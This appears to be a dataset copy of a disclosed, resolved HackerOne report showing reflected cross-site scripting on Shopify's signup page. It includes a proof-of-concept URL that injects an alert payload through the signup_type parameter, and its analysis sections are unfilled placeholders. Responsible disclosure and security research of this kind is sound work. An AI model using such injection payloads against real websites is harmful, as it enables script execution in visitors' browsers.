---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '85291'
original_report_id: '85291'
title: XSS https://www.shopify.com/signup
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2015-08-27T22:32:52.176Z'
disclosed_at: '2015-08-31T22:37:28.032Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS https://www.shopify.com/signup

## Metadata

- HackerOne Report ID: 85291
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2015-08-31T22:37:28.032Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://www.shopify.com/signup?signup_type=%27|alert%28%27XSS%27%29|%27
Vulnerable param is signup_type. For the XSS i used '|alert('XSS')|'

Tested in Mozilla Firefox 40.0.3

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
